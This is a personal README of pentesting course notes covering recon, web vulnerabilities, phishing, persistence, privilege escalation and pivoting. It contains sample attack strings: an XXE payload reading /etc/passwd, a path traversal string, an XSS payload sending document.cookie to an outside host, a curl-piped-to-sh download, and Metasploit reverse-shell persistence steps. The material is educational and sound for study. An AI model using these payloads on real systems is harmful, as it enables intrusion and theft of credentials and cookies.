# Pentesting-Course-Notes

This repository contains my personal notes from my pentesting course. It serves as a reference for concepts and techniques that were new to me or that I found important to retain.

--- 
## Level 1: Reconnaissance on the Customer's External Infrastructure

Passive methods for searching domain names and subdomains:
- [dnsdumpster.com](https://dnsdumpster.com)
- [shodan.io](https://shodan.io)
- [censys.io](https://censys.io)
- [crt.sh](https://crt.sh)
- [pentest-tools.com](https://pentest-tools.com)

Active subdomain enumeration using amass:
```
amass enum -v -src -ip -d <site.com>
```

Data to gather during reconnaissance:

- Domain names
- "Live" IP addresses
- Open ports
- Operating system versions
- Services running on ports
- Web technologies in use

Useful tools for OSINT (Open-Source Intelligence):

- osintframework.com
- awesome-osint repository

For fast network scanning, consider using masscan.

--- 

## Level 2: Initial Access Attacks

Initial Access Attacks involve unauthorized attempts to gain access to systems, networks, or applications with the aim of acquiring the initial level of access and infiltrating them.

ffuf is a useful utility for scanning website directories:
```
ffuf -w /path/to/wordlist.txt -u http://example.com/FUZZ -fc 403
```

### Access Control in Web Applications

Access control mechanisms play a crucial role in limiting access to sensitive functions and resources to specific types of users. There are two main categories of access control: vertical access control and horizontal access control.
Vertical Access Control

* Vertical access control restricts access to sensitive functions that are not available to other user types. Insecure Function Level Access Control (IFLAC) is a subcategory of access control vulnerabilities. A vulnerable function level access control may allow attackers to access unauthorized functions for their role.
Horizontal Access Control

* Horizontal access control mechanisms limit access to resources for users who have explicitly been granted access to those resources. Insecure Direct Object References (IDOR) is also a subcategory of access control vulnerabilities.
Context-Sensitive Access Control

* Context-sensitive access control elements restrict access to functionality and resources based on the application's state or user interaction with it.

### Path Traversal or Directory Traversal

Path Traversal, also known as Directory Traversal, is a web security vulnerability that allows an attacker to read arbitrary files on the server hosting the application. Here's an example of vulnerable code:

```
<?php
$template = 'red.php';
if (isset($_COOKIE['TEMPLATE'])) {
    $template = $_COOKIE['TEMPLATE'];
}
include "/home/users/phpguru/templates/" . $template;
```

In this case, a user can manipulate the data being sent and add the string ../../../../../etc/passwd to the data sent to the server. As a result, the server will execute a request to the file located at /home/users/phpguru/templates/../../../../../etc/passwd.

### XML External Entity (XXE) Injection

XML External Entity (XXE) Injection is a web security vulnerability that allows an attacker to view files on the server's file system and interact with internal or external systems. It occurs due to vulnerabilities in the processing of external entities in XML (Extensible Markup Language).

For example, let's consider a scenario where a trading application checks the inventory level of a product by sending the following XML to the server:

```
<?xml version="1.0" encoding="UTF-8"?>
<product>
  <id>123</id>
  <name>Product XYZ</name>
  <quantity>10</quantity>
</product>
```

If the application does not implement any specific protection against XXE attacks, an attacker can exploit the XXE vulnerability to retrieve the /etc/passwd file by sending the following XXE payload:


```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<product>
  <id>123</id>
  <name>Product XYZ</name>
  <quantity>&xxe;</quantity>
</product>
```

In this case, the application will parse the external entity xxe and insert the content of the /etc/passwd file into the XML response, allowing the attacker to view sensitive information.

It's essential to implement proper input validation and secure XML parsing techniques to mitigate XXE vulnerabilities.

### Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to compromise the interaction between users and a vulnerable application.
https://public.requestbin.com/r
![src/xss.png](src/xss.png)

There are three main types of XSS attacks:

- Reflected XSS: In this type of attack, the malicious script is part of the current HTTP request, and the server reflects it back in the response without proper sanitization or encoding- 
Example: 
```
https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script- 
```
- Stored XSS: Here, the malicious script is stored in the website's data store, such as a database, and is retrieved and executed when a user accesses a particular page or interacts with the vulnerable component.

Example:
```
<script>
  alert('This is a malicious script!');
  // More harmful actions...
</script>
```
- DOM-based XSS: This vulnerability exists in the client-side code rather than the server-side code. It occurs when the client-side JavaScript code dynamically manipulates the Document Object Model (DOM) without proper sanitization or validation.

Example with eval() or innerHTML:
```
var userValue = '<img src="x" onerror="fetch(\'https://pipedream.net/?\' + document.cookie)" />';
document.getElementById('element').innerHTML = userValue;
```


### Social Engineering

Social Engineering is an approach used by attackers to manipulate individuals and exploit their trust, emotions, or vulnerabilities to gain unauthorized access to sensitive information or perform malicious activities. This section provides a brief overview of the different stages involved in a social engineering attack.

#### Stage 1: Gathering Information about Targets

During this stage, the attacker collects information about the targets. This includes searching for data through search engines like Google and Yandex, as well as utilizing platforms such as Spark-Interfax, Rusprofile, Pravda-Sotrudnikov, and Glassdoor.

To find contact information of employees, various tools can be employed:

- [Infoga](https://github.com/m4ll0k/Infoga): A tool for gathering email information
- [FocaPro](https://github.com/ElevenPaths/FOCA): A metadata analysis tool
- [TheHarvester](https://github.com/laramies/theHarvester): A tool for gathering email addresses, subdomains, hosts, and employee names
- [hunter.io](https://hunter.io)
- [snov.io](snov.io)
- [intelx.io](intelx.io)

#### Stage 2: Preparation of Attack Scenarios

During this stage, the attacker prepares attack scenarios to exploit the targets. Tools such as dnstwist can be used to generate domain variations for domain spoofing. Evilginx2 enables traffic redirection through a proxy, allowing the attacker to intercept communication.

Phishing tools like the Social Engineer Toolkit (SET) and Gophish provide resources to create convincing phishing campaigns.

--- 

## Level 3: Execution of Attack Scenarios and Measurement of Results

In this stage, the attacker executes the prepared attack scenarios and measures the effectiveness of their techniques. The objective is to gain access to sensitive information, compromise systems, or manipulate individuals into performing specific actions.

### Mimipenguin

Mimipenguin is a tool designed for Linux systems that intercepts passwords from memory processes. It can extract sensitive information, such as credentials, from processes running on the system.

### truffleproc

truffleproc is another Linux tool used for password interception from memory. It is capable of searching for passwords and API keys within any process running on the system. It provides a comprehensive approach to extracting valuable information.

### TripleCross

TripleCross is an open-source Linux eBPF rootkit. It showcases the offensive capabilities of eBPF (extended Berkeley Packet Filter) technology. This rootkit demonstrates how eBPF can be leveraged for malicious purposes, highlighting potential security concerns.

### Persistence with Metasploit Framework

The Metasploit Framework offers various options for achieving persistence on compromised systems. The following steps outline one possible approach:

1. Use the exploit exploit/linux/local/service_persistence within Metasploit.
2. Set the session number by replacing # with the corresponding session number.
3. Set the desired payload, such as cmd/unix/reverse_python or cmd/unix/reverse_netcat.
4. Set the local host (your IP address) using the set lhost command.
5. Run the exploit.
6. Utilize the exploit/multi/handler module within Metasploit.
7. Set the same payload and local host.
8. Execute the exploit using the exploit -j command to run it in the background.

These steps demonstrate a basic process for establishing persistence using Metasploit. It's important to note that persistence techniques should only be used in controlled environments and with appropriate authorization.

## Level 4: Privilege Escalation on Server Systems

Privilege escalation is the process of gaining higher-level privileges on a compromised server system. This level focuses on tools and resources that aid in identifying and exploiting vulnerabilities to elevate privileges.

### linpeas

linpeas is a script designed for privilege escalation enumeration on Linux systems. It provides an extensive range of checks to identify potential privilege escalation opportunities. To run the linpeas script on a compromised machine, execute the following command:

```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Running this command will download the linpeas script and execute it on the compromised machine, allowing you to analyze the system for privilege escalation possibilities.

### GTFOBins

GTFOBins is a curated list of Unix-like binaries that can be exploited to gain elevated privileges. The website (https://gtfobins.github.io/) provides detailed documentation on how to leverage specific binaries or commands to escalate privileges. It offers insights into lesser-known functionalities and misconfigurations that can be abused to gain unauthorized access.

---

## Level 5: Beyond the DMZ

This level explores advanced techniques that go beyond the boundaries of the DMZ (demilitarized zone) and delve into activities such as spoofing and sniffing.

### Spoofing

Spoofing involves the manipulation of source or destination addresses in network communications to deceive or impersonate devices or systems. It allows an attacker to masquerade as a trusted entity, potentially bypassing security measures and gaining unauthorized access.

### Sniffing

Sniffing refers to the act of intercepting and capturing network traffic to monitor or extract sensitive information. By capturing packets, an attacker can analyze the data being transmitted over the network, potentially obtaining usernames, passwords, or other confidential information.

---

## Level 6: Network Traffic Forwarding

Level 6 focuses on the technique of network traffic forwarding, specifically through the use of pivoting, proxies, and tunneling methods.

### Pivoting

Pivoting is a technique that allows an attacker to gain access to another part of a network by leveraging a compromised computer within the network. By using the compromised computer as a pivot point, the attacker can bypass network security measures and extend their reach to target additional systems.

### Proxies

Proxies are intermediate servers or applications that act as an intermediary between clients and target servers. They can be used to forward network traffic, providing anonymity, bypassing restrictions, or redirecting traffic through different network paths. Tools like [gost](https://github.com/ginuerzh/gost) and [socat](https://github.com/3ndG4me/socat) are examples of utilities that facilitate traffic forwarding through proxy functionality.

### Tunneling

Tunneling involves encapsulating one protocol within another to enable the transmission of data through networks that may have restrictions or limited access. Some tunneling techniques include:

- DNSCAT2: It establishes an encrypted command and control channel (C&C) by utilizing the DNS protocol, acting as an effective tunnel in almost any network environment.
- Iodine: This software allows the tunneling of IPv4 data through a DNS server, which can be useful in scenarios where internet access is restricted but DNS queries are allowed.
- Hans: It enables IPv4 tunneling through ICMP echo packets, often referred to as a "ping tunnel." This can be handy when internet access is limited to ICMP pings but other protocols are blocked.

### Meterpreter

Meterpreter is a powerful post-exploitation framework within the Metasploit framework. It provides a wide range of capabilities for controlling and interacting with compromised systems. Meterpreter includes functionality for port forwarding, allowing attackers to pivot through compromised systems and redirect traffic.

To perform port forwarding with Meterpreter, you can use the following command:
```
meterpreter > portfwd add –l 3389 –p 3389 –r [target host]
```

By running this command on a compromised node that has access to the attacking and target networks or systems, you can redirect TCP connections through the compromised machine, turning it into a pivot point.

## Level 7
Level 7 focuses on network reconnaissance techniques and compromising Windows machines. It explores protocols such as NBT, LLMNR, and services commonly found on Windows systems.

### NBT (NetBIOS over TCP/IP)

NBT is a mechanism that maps NetBIOS requests to TCP/IP. The NetBIOS Name Service (NBT-NS) is a Windows protocol used to translate NetBIOS names into IP addresses within a local network.

### LLMNR (Link-Local Multicast Name Resolution)

LLMNR is a TCP/IP protocol based on the DNS packet format. It allows computers to perform name resolution of hosts within a local network. LLMNR can be leveraged for malicious purposes during network reconnaissance.

### MS17-010

MS17-010 is a security update that addresses vulnerabilities in Microsoft Windows. Exploiting these vulnerabilities can lead to unauthorized access and compromise of Windows systems.
Common Windows Services

Understanding the ports associated with common Windows services can aid in reconnaissance and exploitation. Here are some notable ports and services commonly found on Windows 10 systems:

- 88: Kerberos (Kerberos Key Distribution Center) - This port's presence helps identify the domain controller within a network.
- 135: MSRPC (Microsoft RPC) - Used in Microsoft client-server applications (e.g., Exchange) to perform various operations within the operating system with appropriate credentials.
- 137: NETBIOS-NS (NetBIOS Name Service) - Allows querying of a machine's domain name and MAC address.
- 389: LDAP (Lightweight Directory Access Protocol) - This port offers various possibilities, including credential brute-forcing and accessing LDAP by exploiting vulnerabilities.
- 445: SMB (Server Message Blocks over IP) - The SMB protocol has had vulnerabilities in various versions, potentially leading to code execution, session hijacking, and unauthorized access to data on file servers.
- 1433: MSSQL (Microsoft SQL Server) - The MSSQL service provides access to database management and, more critically, can allow arbitrary code execution on a Windows machine if there is an account with access to the database.
- 3389: RDP (Remote Desktop Protocol) - Remote Desktop Services have had vulnerabilities in the past, such as BlueKeep, which allowed arbitrary code execution. RDP is also susceptible to MITM attacks, enabling access to the service on behalf of the victim.
- Web Proxy Auto-Discovery Protocol (WPAD) - A method used by clients to determine the location (URL) of a proxy configuration file using DHCP and/or DNS technologies.

### Responder

[Responder](https://github.com/SpiderLabs/Responder) is a tool used to perform Man-in-the-Middle (MitM) attacks against Windows authentication methods. This program intercepts LLMNR, NBT-NS, and MDNS traffic, redirecting authentication requests and hashes to a controlled node for further exploitation.

Responder can be employed to capture authentication credentials and gain unauthorized access to compromised Windows systems during network reconnaissance.


## Key terms:

- DMZ (Demilitarized Zone): A network segment located between the external and internal networks.
- DC (Domain Controller): A server that performs account management functions.
- IDS (Intrusion Detection System): Used to detect attacks.
- IPS (Intrusion Prevention System): Used to detect and prevent attacks.
- SSRF (Server-Side Request Forgery): A vulnerability that allows an attacker to make requests from the server to other resources.
- XML (eXtensible Markup Language)
- XXE (XML External Entity)
- XSS (Cross-Site Scripting)

Feel free to explore the contents of this repository. It showcases my knowledge and skills in pentesting.
